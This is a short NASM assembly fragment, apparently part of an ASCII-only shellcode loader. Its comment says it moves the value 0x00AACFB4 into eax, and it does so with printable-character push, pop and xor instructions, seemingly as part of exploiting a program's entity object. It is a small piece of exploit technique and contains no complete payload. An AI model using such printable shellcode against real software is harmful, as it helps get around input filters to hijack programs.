%include 'globals.inc'

bits 32
section text
org asciiLoaderBase

; ascii shellcode to move 0x00AACFB4 into eax
	
	push ecx					; save entity obj this ptr
	
	push edx
	pop eax
	xor al, 2Ch
	push 61616161h
	pop esi
	xor esi, [eax]
	push esi
	pop eax
	xor eax, 61616175h